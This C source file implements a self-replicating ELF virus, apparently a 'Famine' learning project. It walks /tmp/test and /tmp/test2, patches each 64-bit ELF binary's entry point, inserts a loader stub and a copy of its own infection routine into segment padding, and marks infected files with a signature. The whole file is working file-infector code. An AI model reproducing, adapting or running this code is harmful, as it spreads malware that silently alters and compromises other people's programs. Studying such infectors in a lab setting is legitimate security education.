#include "famine.h"

void	infect(void)
{
	char *dir[] = {
		(char[10]){'/', 't', 'm', 'p', '/', 't', 'e', 's', 't', '\0'},
		(char[11]){'/', 't', 'm', 'p', '/', 't', 'e', 's', 't', '2', '\0'}
	};
	for (int i = 0; i < 2; i++)
		infect_dir(dir[i]);
}

void	infect_dir(const char *path)
{
	int		fd;

	ft_putstr(path);
	fd =  syscall_open(path, O_RDONLY | O_DIRECTORY);
	if (fd > 0)
	{
		#ifdef DEBUG
			debug_print_file_type(path, _DIR);
		#endif
		int		nread;
		char	buffer[1024];

		/* Get files/directories inside */
		while ((nread = syscall_getdents(fd, (struct linux_dirent *)buffer, 1024)) > 0)
		{
			long					bpos;
			struct linux_dirent		*linux_dir;

			for (bpos = 0; bpos < nread;)
			{
				linux_dir = (void *)buffer + bpos;
				if (ft_strcmp(linux_dir->d_name, ".") && ft_strcmp(linux_dir->d_name, ".."))
				{
					char new_path[MAX_PATH_LENGTH];

					ft_strcpy(new_path, path);
					ft_strcat(new_path, "/");
					ft_strcat(new_path, linux_dir->d_name);
					choose_infect(new_path);
				}
				bpos += linux_dir->d_reclen;
			}
		}
		syscall_close(fd);
	}
	#ifdef DEBUG
	else // locked
		debug_print_file_type(path, _LOCK);
	#endif
}

void	choose_infect(char *path)
{
	int				ret;
	struct stat		statbuf;

	syscall_stat(path, &statbuf);
	if ((statbuf.st_mode & S_IFMT) == S_IFDIR) // is directory
		infect_dir(path);
	else if ((statbuf.st_mode & S_IFMT) == S_IFREG) // is file 
	{
		ret = infect_file(path);
		#ifdef DEBUG
			if (ret)
				debug_print_error(ret, path);
		#endif
	}
	#ifdef DEBUG
	else // is everything else
		debug_print_file_type(path, _UNKNOW);
	#endif
}

int		infect_file(char *file)
{
	int				ret;
	int				fd;
	t_elf			elf;

	fd = syscall_open(file, O_RDWR);
	if (fd < 0)
	{
		#ifdef DEBUG
			debug_print_file_type(file, _LOCK_W);
		#endif
		return (0);
	}
	#ifdef DEBUG
		debug_print_file_type(file, _FILE);
	#endif
	elf.filename = file;
	if (ret = infect_fd(fd, &elf))
		syscall_close(fd);
	return (ret);
}

int			infect_fd(int fd, t_elf *elf)
{
	int				ret;
	void			*header[64];

	ret = syscall_read(fd, header, 64);
	if (ret < 0)
		return (ret);
	ret = check_magic_elf(header);
	if (ret != ET_EXEC && ret != ET_DYN)
		return (NOT_ELF);
	ret = 0;
	elf->size = syscall_lseek(fd, (size_t)0, SEEK_END);
	if (elf->size < 0 ||
(elf->addr = syscall_mmap(NULL, elf->size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
		return (-1000);
	if (ft_memmem(elf->addr, elf->size, SIGNATURE, ft_strlen(SIGNATURE)))
	{
		syscall_munmap(elf->addr, elf->size);
		return (ALREADY_INFECTED);
	}
	if ((ret = init_elf(elf, elf->addr, elf->size)) < 0)
	{
		syscall_munmap(elf->addr, elf->size);
		return (ret);
	}
	Elf64_Phdr	*next = elf->pt_load + 1;
	int		size_needed = INJECT_SIZE + ft_strlen(SIGNATURE) + ((intptr_t)_start - (intptr_t)infect);
	int		previous_padding = next->p_offset - (elf->pt_load->p_offset + elf->pt_load->p_filesz);
	int		n_page_size = ((size_needed - previous_padding) / PAGE_SIZE) + 1;
	if (n_page_size > 1)
	{
		syscall_munmap(elf->addr, elf->size);
		return (TOO_BIG);
	}
	int		nb_zero_to_add = n_page_size * PAGE_SIZE - (size_needed - previous_padding);
	if (nb_zero_to_add > 4096)
		nb_zero_to_add = previous_padding - size_needed;
	char	*new;

	new = syscall_mmap(NULL, elf->size + size_needed + nb_zero_to_add - previous_padding, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
	if (!new)
	{
		syscall_munmap(elf->addr, elf->size);
		return (-1000);
	}
	create_infection(new, elf, nb_zero_to_add);
	syscall_munmap(elf->addr, elf->size);
	syscall_close(fd);
	ret = write_infection(elf->filename, new, elf->size + size_needed + nb_zero_to_add - previous_padding);
	syscall_munmap(new, elf->size + size_needed + nb_zero_to_add - previous_padding);
	return (ret);
}

int			write_infection(char *file, char *buffer, int size)
{
	int		fd;

	fd = syscall_open(file, O_TRUNC | O_WRONLY);
	if (fd < 0)
		return (-1000);
	syscall_write(fd, buffer, size);
	syscall_close(fd);
	return (0);
}

void	add_injection(void **dst, t_elf *elf, uint64_t entry_inject, uint64_t entry_infect)
{

	ft_memcpy(*dst, INJECT, INJECT_SIZE - (sizeof(uint64_t) * 4));
	*dst += INJECT_SIZE - (sizeof(uint64_t) * 4);
	#ifdef DEBUG
		ft_putstr("INJECTION: \n");
		ft_putstr("vaddr: 0x");
		ft_puthexa(elf->pt_load->p_vaddr);
		ft_putstr("\nentry_inject: 0x");
		ft_puthexa(entry_inject);
		ft_putstr("\nentry_prg: 0x");
		ft_puthexa(elf->header->e_entry);
		ft_putstr("\nentry_infect: 0x");
		ft_puthexa(entry_infect);
		ft_putstr("\n");
	#endif
	ft_memcpy(*dst + sizeof(uint64_t) * 0, &elf->pt_load->p_vaddr, sizeof(uint64_t));
	ft_memcpy(*dst + sizeof(uint64_t) * 1, &entry_inject, sizeof(uint64_t));
	ft_memcpy(*dst + sizeof(uint64_t) * 2, &elf->header->e_entry, sizeof(uint64_t));
	ft_memcpy(*dst + sizeof(uint64_t) * 3, &entry_infect, sizeof(uint64_t));
	*dst += sizeof(uint64_t) * 4;
}

void	create_infection(void *dst, t_elf *elf, int nb_zero)
{
	uint64_t	new_entry;
	uint64_t	entry_infect;
	void		*src;
	void		*end;
	void		*start;
    Elf64_Off    e_shoff;

	start = dst;
	src = elf->addr;
	end = src + elf->size;
	ft_memcpy(dst, src, (unsigned long)&elf->header->e_entry - (unsigned long)src);
	dst += (unsigned long)&elf->header->e_entry - (unsigned long)src;
	src = &elf->header->e_entry;
	new_entry = elf->pt_load->p_offset + elf->pt_load->p_filesz;
	entry_infect = elf->pt_load->p_offset + elf->pt_load->p_filesz + INJECT_SIZE;
	ft_memcpy(dst, &new_entry, sizeof(elf->header->e_entry));
	dst += sizeof(elf->header->e_entry);
	src += sizeof(elf->header->e_entry);
	/* DONE IN ADD_PADDING_SEGMENTS
	ft_memcpy(dst, src, (unsigned long)&elf->header->e_shoff - (unsigned long)src);
	e_shoff = elf->header->e_shoff + ; */
	src = update_segment_sz(src, &dst, elf->pt_load);
//	src = add_padding_segments(elf, src, &dst);
	int pt_load_size_left = ((unsigned long)elf->addr + elf->pt_load->p_offset + elf->pt_load->p_filesz) - (unsigned long)src;
	ft_memcpy(dst, src, pt_load_size_left);
	dst += pt_load_size_left;
	src += pt_load_size_left;

	add_injection(&dst, elf, new_entry, entry_infect);
	ft_memcpy(dst, infect, ((intptr_t)_start - (intptr_t)infect));
	dst += (intptr_t)_start - (intptr_t)infect;
	ft_memcpy(dst, SIGNATURE, ft_strlen(SIGNATURE));
	dst += ft_strlen(SIGNATURE);
	ft_memset(dst, 0, nb_zero);
	dst += nb_zero;

	Elf64_Phdr	*next = elf->pt_load + 1;

	src = elf->addr + next->p_offset;
//	src = add_padding_sections(elf, src, &dst);
	ft_memcpy(dst, src, (unsigned long)end - (unsigned long)src);
	dst += (unsigned long)end - (unsigned long)src;
}
